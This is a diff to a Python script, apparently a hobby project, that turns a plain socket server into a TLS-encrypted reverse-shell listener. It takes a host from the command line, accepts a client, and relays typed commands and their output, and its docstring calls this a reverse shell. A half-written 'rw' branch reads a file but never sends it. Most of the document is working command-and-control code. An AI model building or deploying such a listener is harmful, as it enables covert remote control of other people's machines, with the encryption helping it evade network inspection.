@@ -1,49 +1,59 @@
 import socket
 import os
+import sys
+import ssl
 
-# global constants
-SERVER_HOST = "0.0.0.0"
+# constants
+SERVER_HOST = sys.argv[1] # "0.0.0.0" for localhost
 SERVER_PORT = 5050
 BUFFER_SIZE = 1024
 
+key = "openssl/priv.pem"
+certificate = "openssl/cert.crt"
 def main():
-    # create socket object
+
+    '''
+    create socket object
+    bind the socket to all IP addresses of this host
+    begins listening for connection and accepts when a connection is found
+    '''
+
     s = socket.socket()
-
-    # bind the socket to all IP addresses of this host
     s.bind((SERVER_HOST, SERVER_PORT))
-
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.listen(5)
-    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
-    # accept connection
-    client_socket, client_address = s.accept()
+    s_ssl = ssl.wrap_socket(s, keyfile=key, certfile=certificate, server_side=True)
+
+    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+    client_socket, client_address = s_ssl.accept()
     print(f"Connected to {client_address[0]}:{client_address[1]}!")
 
-    message = "CONNECTED".encode()
-    client_socket.send(message)
-
-    # Print current working directory
-    print("Current directory: " + str(os.getcwd()))
-
+    '''
+    Initiate reverse shell
+    Issue commands until "exit" is typed"
+    '''
     while True:
-        # get the command from prompt
+        # Print current working directory
+        print("\nCurrent directory: " + str(os.getcwd()))
         command = input("Enter command: ")
 
         # send the command to the client
-        client_socket.send(command.encode('utf-16'))
+        client_socket.send(command.encode('ISO-8859-1'))
+        if command.lower() == "rw":
+            filetosend = open("test.py", "rb")
+            data = filetosend.read(1024)
         if command.lower() == "exit":
             break
 
         # retrieve command results
-        results = client_socket.recv(BUFFER_SIZE).decode('utf-16')
+        results = client_socket.recv(BUFFER_SIZE).decode('ISO-8859-1')
         print(results)
         continue
 
     # close connections
     client_socket.close()
-    s.close()
+    s_ssl.close()
 
 if __name__ == "__main__":
     main()
